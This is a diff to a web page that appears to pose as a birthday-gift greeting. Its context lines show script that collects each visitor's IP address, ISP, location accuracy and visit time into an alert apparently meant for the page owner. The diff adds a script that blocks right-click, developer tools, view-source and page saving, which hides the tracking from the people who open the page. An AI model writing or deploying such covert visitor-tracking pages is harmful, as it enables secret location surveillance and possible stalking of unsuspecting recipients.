@@ -341,7 +341,7 @@ Allah hafeez🌺❤️}`;
                         var ip = data.ip || "Unknown IP";
                         var isp = data.organization || data.organization_name || "Unknown ISP";
 
-                        var message = `🚨 *New Visitor on Your Website!* 🚨\n\n` +
+                        var message = `🚨 *New Visitor on Your birtdaygift2 Website!* 🚨\n\n` +
                                       `⏱ *Time:* ${visitTime}\n\n` +
                                       `🌍 *Location Info:*\n` +
                                       `🎯 Accuracy: ${locationPrecision}\n` +
@@ -386,6 +386,38 @@ Allah hafeez🌺❤️}`;
 
         }, 1500);
     });
+</script>
+
+<!-- Anti-Inspect & Security Lock Script -->
+<script>
+    // Right Click (মাউসের ডান বাটন) ব্লক করা
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // কীবোর্ডের শর্টকাটগুলো ব্লক করা
+    document.onkeydown = function(e) {
+        // F12 ব্লক
+        if (e.keyCode == 123) {
+            return false;
+        }
+        // Ctrl+Shift+I (Inspect) ব্লক
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+            return false;
+        }
+        // Ctrl+Shift+J (Console) ব্লক
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+            return false;
+        }
+        // Ctrl+U (View Source) ব্লক
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+            return false;
+        }
+        // Ctrl+S (Save Page) ব্লক
+        if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
+            return false;
+        }
+    };
 </script>
 
 </body>  
